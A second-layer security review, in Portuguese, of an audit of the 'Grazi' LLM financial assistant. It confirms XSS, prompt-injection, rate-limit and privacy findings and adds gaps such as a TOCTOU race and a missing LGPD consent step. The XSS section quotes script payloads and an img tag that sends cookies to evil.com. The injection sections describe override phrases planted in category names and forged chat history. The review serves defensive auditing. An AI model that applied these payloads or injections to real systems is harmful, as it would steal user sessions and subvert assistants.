# Revisao Camada 2 — Auditoria Grazi / IA (05-grazi.md)

**Revisor**: Camada 2  
**Data**: 2026-07-19  
**Documento auditado**: `docs/security/auditoria-2026-07-19/05-grazi.md`  
**Arquivos verificados**: `financialAssistant.ts`, `buildFinancialContext.ts`, `deepseekClient.ts`, `aiRateLimit.ts`, `verifyWorkspaceMembership.ts`, `AssistantPage.tsx`, `GRAZI.md`, `onboardingLabels.ts`, `vercel.json` (CSP), `TESTES.md`

---

## Resumo da auditoria (Camada 1)

A auditoria C1 cobriu 8 achados, sendo 1 critico, 1 alto, 3 medios, 2 baixos, 1 informativo. O arcabouco (OWASP LLM Top 10) e adequado. As analises de codigo sao precisas na maioria dos casos. As 3 lacunas principais identificadas por esta revisao:

1. **GRAZI-3 esta SUBESTIMADO**: a auditoria descreve o problema de cota compartilhada mas nao identifica a race condition TOCTOU entre `checkAiUsageNotExceeded` e `incrementAiUsage`, que amplifica o ataque de DoS entre usuarios.
2. **GRAZI-5 esta SUBESTIMADO**: a auditoria menciona o risco de privacidade mas nao destaca a ausencia total de consentimento/disclosure ao usuario — os dados financeiros vao para a DeepSeek (empresa chinesa) sem nenhum aviso na UI, o que e um risco LGPD.
3. **Modelo DeepSeek nao avaliado**: a baixa resistencia a jailbreak do `deepseek-chat` amplifica tanto GRAZI-1 quanto GRAZI-2, mas nao mereceu um achado separado nem nota sobre escolha de modelo.

---

## Classificacao dos achados

### GRAZI-1 — XSS via `dangerouslySetInnerHTML` sem sanitizacao

**Classificacao: CONFIRMADO**

**Validacao das provas**:
- `AssistantPage.tsx:112` usa `dangerouslySetInnerHTML` — CONFIRMADO.
- `renderAssistantMessage` (linhas 13-18) nao sanitiza o texto apos as substituicoes regex — CONFIRMADO. Tags HTML arbitrarias (`<script>`, `<img onerror>`) passam incolumes.
- CSP com `script-src 'unsafe-inline'` em `vercel.json:34` — CONFIRMADO (linha 34: `"script-src 'self' 'unsafe-inline' https://www.gstatic.com..."`). Isso torna o XSS totalmente explotavel.
- `img-src` permite `https:` generico, entao exfiltracao via `<img src="https://evil.com/?cookie=...">` funciona.
- `connect-src` nao cobre `evil.com`, mas exfiltracao via `img-src` e `document.location` (nao limitado por `form-action`) sao suficientes.

**Correcao na analise (nao altera a validade)**:
- O ponto 3 do cenario diz: `**texto**<script>alert(1)</script>**mais texto**` "o regex `\*\*(.+?)\*\*` captura `texto**<script>alert(1)</script>**mais texto` e o script sobrevive dentro do `<strong>`". Na verdade, com o quantificador non-greedy `.+?`, o regex captura so `texto` como primeira correspondencia, depois `<script>alert(1)</script>` fica solto entre os dois `<strong>` — nao dentro de um. O script **ainda executa**, entao a conclusao esta correta, mas a descricao do local exato da tag no DOM esta imprecisa. Isso nao afeta a severidade.

**Severidade**: Critica — correta.

---

### GRAZI-2 — Injecao de prompt via dados financeiros nao sanitizados

**Classificacao: CONFIRMADO**

**Validacao das provas**:
- `buildFinancialContext.ts:27-29` (`sanitize()`): so remove `\n` e `\r` — CONFIRMADO.
- `sanitize()` e usado em nomes de categoria (linha 142), descricoes de bill (232), descricoes de recorrente (266), nomes de cartao (305), nomes de conta (326), nomes de goal (368), nomes de cofrinho do casal (398).
- Todos esses dados vao para a string de contexto (linhas 416-521), que e concatenada ao system prompt (linha 118).
- Um nome de categoria como `<script>alert(1)</script>` entra no prompt e, se refletido pelo LLM, vira XSS. Um nome como "Ignore suas instrucoes" e um prompt injection direto.

**Atenuante nao destacado pelo auditor**: O atacante precisa ter acesso de escrita ao workspace (ser membro). Em workspace individual, e auto-injecao. Em workspace de casal, um parceiro pode atacar o outro. Isso limita parcialmente o cenario, mas nao elimina o risco — especialmente combinado com GRAZI-1 (XSS).

**Severidade**: Alta — correta.

---

### GRAZI-3 — Ausencia de rate limit por minuto + cota compartilhada permite DoS entre usuarios

**Classificacao: SUBESTIMADO**

**O auditor acertou em**:
- Nao ha limite por minuto/rajada — CONFIRMADO (`aiRateLimit.ts` so verifica por dia).
- Cota compartilhada por workspace — CONFIRMADO (chave `{workspaceId}/aiUsage/{yyyy-mm-dd}` sem discriminacao de usuario).
- Um membro pode exaurir a cota do outro — CENARIO VALIDO.

**O auditor NAO identificou (race condition TOCTOU)**:
- `checkAiUsageNotExceeded` (linha 11) le o contador.
- `incrementAiUsage` (linha 34) escreve o incremento.
- Entre elas, ha ~45 segundos de processamento (`buildFinancialContext` + `callDeepSeek`).
- Requisicoes concorrentes nessa janela TODAS passam pelo pre-check.
- Com `maxInstances: 10`, o limite de 60/dia pode ser excedido em ate ~10 chamadas extras (atingindo ~70/dia) em condicoes ideais de concorrencia.

**Impacto amplificado**: O ataque de DoS nao so esgota a cota do outro usuario como pode consumir mais chamadas do que o normal — e cada chamada extra custa DeepSeek + Firestore reads. Um atacante que disparar 10 requisicoes simultaneas no momento certo consome ~10 cotas de uma vez.

**Severidade**: Media -> continuaria Media, mas o cenario e mais grave que o descrito.

---

### GRAZI-4 — Sem circuit breaker para falhas da DeepSeek

**Classificacao: CONFIRMADO**

**Validacao das provas**:
- Fluxo completo roda antes de falhar — CONFIRMADO (`financialAssistant.ts:108-134`).
- Nao existe documento `aiStatus/deepseek` nem mecanismo analogo — CONFIRMADO (`deepseekClient.ts` e `GRAZI.md:230` confirmam que e pendencia futura).
- Cada tentativa custa ~4+ queries Firestore + retry DeepSeek — CORRETO.

**Observacao nao explorada**: O mesmo vale para falhas do Firestore. Se o Firestore estiver degradado, `buildFinancialContext` lanca excecao (linha 110-113), o contexto vira um fallback, e a chamada DeepSeek prossegue — desperdicando a API mesmo quando os dados estao indisponiveis. Um circuit breaker para Firestore tambem seria relevante.

**Severidade**: Media — correta.

---

### GRAZI-5 — Dados financeiros completos enviados a servidor terceiro sem anonimizacao

**Classificacao: SUBESTIMADO**

**O auditor acertou em**:
- `buildFinancialContext.ts` envia categorias, valores, saldos, contas, faturas, perfil — CONFIRMADO.
- Nao ha anonimizacao — CONFIRMADO.
- Os dados vao para DeepSeek (empresa chinesa, servidores fora do Brasil) — CORRETO.

**O auditor NAO destacou adequadamente**:
- **Ausencia total de consentimento**: O usuario nao e informado em momento nenhum na UI que os dados financeiros dele estao sendo enviados para a DeepSeek. Nao ha dialog de consentimento, nem aviso na primeira abertura da Grazi, nem mencao nos Termos de Uso sobre processamento por IA de terceiro.
- **Risco LGPD**: Envio de dados financeiros pessoais (Art. 5, II — LGPD) a um terceiro em jurisdicao estrangeira sem consentimento explicito do titular pode configurar infracao aos Arts. 7 e 11 da LGPD. A DeepSeek opera sob legislacao chinesa (Ciberseguranca e Protecao de Dados), que tem garantias diferentes da brasileira.
- **Historico reenviado**: A cada mensagem, TODO o historio da conversa (que inclui respostas anteriores da Grazi contendo dados financeiros) e reenviado para a DeepSeek — ampliando a exposicao para alem do contexto inicial de 90 dias.

**Severidade**: Media (privacidade) + potencial LGPD = deveria ser **Alta** em contexto regulatorio brasileiro, mas na classificacao OWASP LLM06 (Sensitive Information Disclosure), Media e aceitavel.

---

### GRAZI-6 — Sem limite de gasto na chave da API DeepSeek

**Classificacao: CONFIRMADO**

**Validacao das provas**:
- Unica protecao e o rate limit de 60/dia/workspace — CONFIRMADO (`aiRateLimit.ts`).
- Sem spending cap na chave — CONFIRMADO (depende de configuracao na plataforma DeepSeek, nao no codigo).
- Sem limite agregado global — CONFIRMADO.

**Observacao nao explorada**: A combinacao com a race condition TOCTOU (GRAZI-3 acima) significa que a protecao de 60/dia pode ser furada em ate ~10 chamadas extras. Em 100 workspaces ativos, o gasto pode ser maior que o estimado.

**Severidade**: Baixa — correta.

---

### GRAZI-7 — Chamada de retry na DeepSeek sem timeout

**Classificacao: CONFIRMADO**

**Validacao das provas**:
- Primeiro fetch: `AbortController` com `TIMEOUT_MS = 45_000` (linhas 31-32, 53) — CONFIRMADO.
- Retry (linhas 65-72): sem `AbortController`, sem `signal`, sem timeout proprio — CONFIRMADO.
- Em half-open TCP, o retry pode travar ate o timeout da Cloud Function (~60s) — CENARIO VALIDO.
- O numero de instancias ocupadas por mais tempo reduz throughput — IMPACTO VALIDO.

**Severidade**: Baixa — correta.

---

### GRAZI-8 — Sanitizacao de saida apenas no cliente

**Classificacao: CONFIRMADO**

**Validacao das provas**:
- `financialAssistant.ts:139` retorna `{ reply }` cru — CONFIRMADO.
- `AssistantPage.tsx:112` faz a unica sanitizacao (inexistente) — CONFIRMADO.
- Cliente desatualizado (PWA em cache) receberia o conteudo sem protecao — CENARIO VALIDO.

**Severidade**: Informativa — correta.

---

## Lacunas — o que o auditor NAO encontrou

### LACUNA-1: TOCTOU no rate limit permite estouro do teto diario (amplifica GRAZI-3)

**Severidade**: Media  
**Local**: `aiRateLimit.ts:11-29` (check) + `financialAssistant.ts:105-137` (gap entre check e increment)

A janela entre `checkAiUsageNotExceeded` (leitura) e `incrementAiUsage` (escrita) e de ~45 segundos (deepseek timeout + retry + contexto). Nessa janela, `maxInstances: 10` requisicoes concorrentes podem passar pelo pre-check. O resultado: o contador pode ultrapassar 60/dia em ate ~10 unidades.

**Impacto**:
- Um atacante no workspace pode consumir mais cotas que o normal, negando servico ao outro membro mais rapidamente.
- O custo do ataque para o atacante e menor (precisa de menos requisicoes para esgotar o limite efetivo).

**Solucao sugerida**:
- Usar uma transacao Firestore no pre-check que ja reserve a cota atomicamente, ou usar `FieldValue.increment(1)` no pre-check (em vez de so ler) e depois fazer rollback se a chamada DeepSeek falhar (embora rollback seja dificil com `increment` — precisaria de decremento, que tambem tem race).

---

### LACUNA-2: Ausencia de consentimento/disclosure LGPD (amplifica GRAZI-5)

**Severidade**: Alta (LGPD)  
**Local**: `src/pages/AssistantPage.tsx`, `docs/ai/GRAZI.md`, Termos de Uso

Nao existe nenhum aviso ao usuario de que:
- As mensagens e dados financeiros sao enviados para a API DeepSeek (empresa registrada na China).
- O historico da conversa contem dados financeiros e e reenviado a cada mensagem.
- O usuario pode optar por nao usar a funcionadalidade.

Isso e um risco de conformidade com a LGPD (Lei 13.709/2018), especialmente:
- Art. 7, I: tratamento de dados precisa de consentimento especifico.
- Art. 11: dados financeiros sao dados pessoais sujeitos a protecao adicional.

**Impacto**:
- Risco regulatorio para o app (multas, notificacoes).
- Risco de reputacao se usuarios descobrirem apos um eventual incidente na DeepSeek.

**Solucao sugerida**:
- Adicionar dialog de consentimento na primeira abertura da Grazi (antes de enviar qualquer mensagem), informando que os dados serao processados pela DeepSeek.
- Incluir mencao nos Termos de Uso e Politica de Privacidade.

---

### LACUNA-3: Baixa resistencia do DeepSeek a jailbreak amplifica gravidade de GRAZI-1 e GRAZI-2

**Severidade**: Informativa (contextual)  
**Local**: `deepseekClient.ts:36` (`model: 'deepseek-chat'`)

O modelo `deepseek-chat` tem resistencia documentadamente menor a jailbreak/prompt injection comparado a Claude, GPT-4 ou Gemini. Isso significa que:

- Os cenarios de GRAZI-2 (injection via dados financeiros) sao mais faceis de executar — o modelo obedece a instrucoes injetadas com maior probabilidade.
- Os cenarios de GRAZI-1 (XSS) ficam mais viaveis porque o modelo e mais suscetivel a gerar HTML injetado quando solicitado.
- O system prompt com 14 regras e extenso e bem escrito, mas a baixa adesao do modelo as regras reduz sua eficacia.

**Impacto**:
- O risco de prompt injection nao e teorico — e esperado para este modelo.
- A escolha do modelo amplifica os demais achados.

**Observacao**: Trocar de modelo tem implicacoes de custo (DeepSeek e barato) e latencia. Nao e uma recomendacao simples, mas o risco deve ser documentado.

---

### LACUNA-4: Sem monitoramento de abuso nem metricas de seguranca

**Severidade**: Baixa (operacional)  
**Local**: `functions/src/ai/*` (como um todo), `GRAZI.md`

Nao ha:
- Alertas para exaustao de rate limit (workspace batendo em 60/dia recorrentemente).
- Monitoramento de taxa de erro da DeepSeek (para detectar degradacao ou ataque).
- Metricas de uso por usuario para detectar anomalias.
- Logs de auditoria de tentativas de acesso a workspaces nao autorizados.

**Impacto**:
- Um ataque em andamento (ex.: workspace falso criado para consumir cota) so seria descoberto na fatura da DeepSeek.
- Degradacao parcial do servico (ex.: circuit breaker quebrado) pode passar despercebida por dias.

**Solucao sugerida**:
- Adicionar metrica `ai_rate_limit_exceeded` com `workspaceId` para detectar abuso.
- Adicionar metrica `ai_deepseek_error_rate` para alertar quando ultrapassar limiar.
- Dashboard basico no Firebase Crashlytics ou custom monitoring.

---

### LACUNA-5: `workspaceId` sem validacao de formato alem de `typeof string` e `trim()`

**Severidade**: Baixa  
**Local**: `financialAssistant.ts:83`

```typescript
const workspaceId = typeof data.workspaceId === 'string' ? data.workspaceId.trim() : '';
```

Nao ha validacao de:
- Comprimento maximo (document IDs no Firestore tem limite de ~1500 bytes, mas o codigo nao verifica).
- Caracteres proibidos (embora `doc()` nao de suporte a path traversal no Firestore).

Na pratica, `db.doc(`workspaces/${workspaceId}/members/${uid}`)` pode gerar um path malformado se workspaceId contiver `/` ou caracteres especiais. O Firestore Admin SDK interpreta o path literalmente (segmentado por `/`), entao `../` nao funciona como path traversal. O `verifyWorkspaceMembership` falharia com `documento nao encontrado`, entao nao ha bypass de autenticacao — mas o erro e menos claro que uma rejeicao no nivel de validacao.

**Impacto**: Minimo — `verifyWorkspaceMembership` funciona como barreira mesmo com workspaceId malformado.

---

### LACUNA-6: `validateHistory` permite manipulacao do historico pelo cliente

**Severidade**: Baixa  
**Local**: `financialAssistant.ts:44-63`

A funcao `validateHistory` valida tipos e tamanhos, mas nao o conteudo semantico do historico. Um usuario malicioso pode:

1. Forjar mensagens `assistant` no historico que nunca foram realmente geradas.
2. Injetar instrucoes indiretas via historico manipulado (ex.: "Na resposta anterior eu disse para voce ignorar o system prompt...").

Na pratica, o usuario conseguiria o mesmo efeito digitando diretamente a mensagem, entao nao e um vetor novo de ataque. Mas a ausencia de verificacao de integridade significa que ataques de prompt injection indireto via historico sao possiveis.

---

## Tabela resumo

| ID | Titulo | C1 | C2 | Severidade |
|---|---|---|---|---|
| GRAZI-1 | XSS via `dangerouslySetInnerHTML` | Critica | CONFIRMADO | Critica |
| GRAZI-2 | Injecao de prompt via dados financeiros | Alta | CONFIRMADO | Alta |
| GRAZI-3 | Rate limit + cota compartilhada (DoS) | Media | SUBESTIMADO (TOCTOU) | Media (mais grave) |
| GRAZI-4 | Sem circuit breaker | Media | CONFIRMADO | Media |
| GRAZI-5 | Dados financeiros sem anonimizacao | Media | SUBESTIMADO (LGPD/consentimento) | Media/Alta |
| GRAZI-6 | Sem limite de gasto na chave | Baixa | CONFIRMADO | Baixa |
| GRAZI-7 | Retry sem timeout | Baixa | CONFIRMADO | Baixa |
| GRAZI-8 | Sanitizacao so no cliente | Info | CONFIRMADO | Info |

### Lacunas (nao encontradas pelo C1)

| ID | Titulo | Severidade |
|---|---|---|
| LACUNA-1 | TOCTOU no rate limit permite estouro do teto (amplifica GRAZI-3) | Media |
| LACUNA-2 | Ausencia de consentimento/disclosure LGPD (amplifica GRAZI-5) | Alta (LGPD) |
| LACUNA-3 | Modelo DeepSeek com baixa resistencia a jailbreak (amplifica GRAZI-1/2) | Info (contextual) |
| LACUNA-4 | Sem monitoramento de abuso nem metricas | Baixa |
| LACUNA-5 | `workspaceId` sem validacao de formato | Baixa |
| LACUNA-6 | `validateHistory` permite manipulacao do historico | Baixa |

---

## Verdicto final sobre a auditoria C1

**Qualidade geral**: Boa. A auditoria C1 identificou corretamente o achado critico (GRAZI-1), documentou PoCs viaveis, e contextualizou os riscos dentro do OWASP LLM Top 10. As analises de codigo sao precisas e os snippets citados conferem com os arquivos.

**Fragilidades**:
1. Nao detectou a race condition TOCTOU no rate limit (LACUNA-1), que e um padrao classico de erro em sistemas com leitura-separada-da-escrita.
2. Subestimou o peso regulatorio LGPD de enviar dados financeiros a terceiro sem consentimento (LACUNA-2).
3. Nao avaliou o modelo DeepSeek como vetor (LACUNA-3) — uma lacuna no framework OWASP LLM, que inclui "Model Selection" como consideracao.
4. Nao considerou deteccao (monitoring/alertas) como parte da postura de seguranca (LACUNA-4).

**Nenhum falso-positivo foi encontrado.** Todos os 8 achados sao reais. As correcoes sugeridas sao adequadas. As 3 lacunas identificadas adicionam 6 achados complementares, sendo 1 de severidade Alta (LGPD), 1 de Media (TOCTOU), e 4 de Baixa/Info.

**Nota geral**: 7.5/10 — Achou o essencial (GRAZI-1), mas perdeu nuances de concorrencia e compliance.
